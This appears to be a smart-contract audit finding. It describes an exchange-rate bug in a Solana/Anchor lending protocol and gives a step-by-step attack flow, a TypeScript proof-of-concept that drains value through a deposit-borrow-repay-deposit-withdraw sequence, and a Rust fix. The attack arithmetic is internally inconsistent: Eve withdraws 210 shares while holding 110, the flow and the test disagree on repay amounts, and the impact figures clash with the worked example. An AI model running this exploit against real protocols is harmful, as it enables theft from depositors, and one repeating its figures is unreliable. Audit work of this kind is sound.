# F-001: Exchange Rate Uses deposit_tokens Instead of vault_balance

**Severity:** Critical
**Protocol Type:** Lending (Compound-style, Solana/Anchor)
**Invariant Violated:** I2 (No Mint Inflation)
**Date:** 2026

---

## Description

The lending protocol's exchange rate formula incorrectly uses `deposit_tokens` (book value of deposits) instead of `vault_balance` (actual tokens in the pool). After a borrow→accrue→repay cycle, these two values diverge because repaid interest increases `vault_balance` without updating `deposit_tokens`. This divergence allows an attacker to mint shares at a severely deflated exchange rate, extracting funds from other depositors.

## Impact

**Direct:** An attacker can mint shares at 1/100th of their fair value after a borrow+accrue+repay cycle, then withdraw at the correct rate — extracting value from all other depositors.

**Attack requires:** 1 deposit → 1 borrow → wait for interest accrual → 1 repay → 1 deposit (the attack) → withdraw all.

**Profit:** Up to 100% of the pool's total value in a single transaction.

## Root Cause

```rust
// Incorrect: uses deposit_tokens (book value)
fn exchange_rate(&self) -> u64 {
    let total_value = self.deposit_tokens + self.total_borrows - self.uncollected_fees;
    total_value / self.total_shares
}
```

After interest accrual and repayment, `vault_balance > deposit_tokens` because the interest paid by borrowers goes to the vault but `deposit_tokens` is not updated. The exchange rate should use the actual cash available:

```rust
// Correct: uses vault_balance (actual cash)
fn exchange_rate(&self) -> u64 {
    let total_value = self.vault_balance + self.total_borrows - self.uncollected_fees;
    total_value / self.total_shares
}
```

## Attack Flow

1. Alice deposits 100 tokens → receives 100 shares (rate = 1.0)
2. Bob borrows 50 tokens → `vault_balance = 50`, `deposit_tokens = 100`
3. Time passes → 10 tokens interest accrued → `total_borrows = 60`
4. Bob repays 60 tokens → `vault_balance = 110`, `deposit_tokens = 100` (still!)
5. **BUG:** Exchange rate now = `(100 + 0 - 0) / 100 = 1.0` but real value = `(110 + 0 - 0) / 100 = 1.1`
6. Eve deposits 110 tokens → receives 110 shares (at deflated rate 1.0 instead of 1.1)
7. Eve withdraws all 210 shares → receives `210 × 1.1 = 231` tokens
8. **Profit: 231 - 110 = 121 tokens (110% return in one tx)**

## Proof of Concept

```typescript
// poc_f001.ts
import * as anchor from "@coral-xyz/anchor";

describe("F-001: Exchange rate uses deposit_tokens", () => {
  it("enables mint inflation attack", async () => {
    // 1. Setup: Alice deposits
    await program.methods.deposit(new anchor.BN(100_000_000))
      .accounts({ user: alice.publicKey, /* ... */ })
      .signers([alice])
      .rpc();

    // 2. Bob borrows
    await program.methods.borrow(new anchor.BN(50_000_000))
      .accounts({ user: bob.publicKey, /* ... */ })
      .signers([bob])
      .rpc();

    // 3. Advance time + accrue interest
    await advanceTime(86_400); // 1 day
    await program.methods.accrueInterest()
      .accounts({ /* ... */ })
      .rpc();

    // 4. Bob repays with interest
    await program.methods.repay(new anchor.BN(55_000_000))
      .accounts({ user: bob.publicKey, /* ... */ })
      .signers([bob])
      .rpc();

    // 5. Eve deposits (ATTACK)
    const eveBalanceBefore = await getBalance(eve.publicKey);
    await program.methods.deposit(new anchor.BN(110_000_000))
      .accounts({ user: eve.publicKey, /* ... */ })
      .signers([eve])
      .rpc();

    // 6. Eve withdraws everything
    await program.methods.withdraw(new anchor.BN(/* all shares */))
      .accounts({ user: eve.publicKey, /* ... */ })
      .signers([eve])
      .rpc();

    const eveBalanceAfter = await getBalance(eve.publicKey);
    
    // Eve should have MORE than deposited (attack succeeded)
    expect(eveBalanceAfter).to.be.greaterThan(eveBalanceBefore);
    // Expected: ~231 tokens (110% profit)
  });
});
```

## Recommended Mitigation

Replace `deposit_tokens` with `vault_balance` in the exchange rate formula:

```rust
fn exchange_rate(&self) -> u64 {
    let total_value = self
        .vault_balance          // ← Actual cash in vault
        .checked_add(self.total_borrows)
        .unwrap()
        .checked_sub(self.uncollected_fees)
        .unwrap();
    
    if self.total_shares == 0 {
        return PRECISION;
    }
    
    total_value
        .checked_mul(PRECISION)
        .unwrap()
        .checked_div(self.total_shares)
        .unwrap()
}
```

This is the canonical Compound formula. Any deviation enables inflation attacks.

---

## References

- Compound Whitepaper, Section 3.1 (Exchange Rate)
- Invariant I2 — No Mint Inflation: `shares × rate ≤ vault + borrows - fees + tolerance`
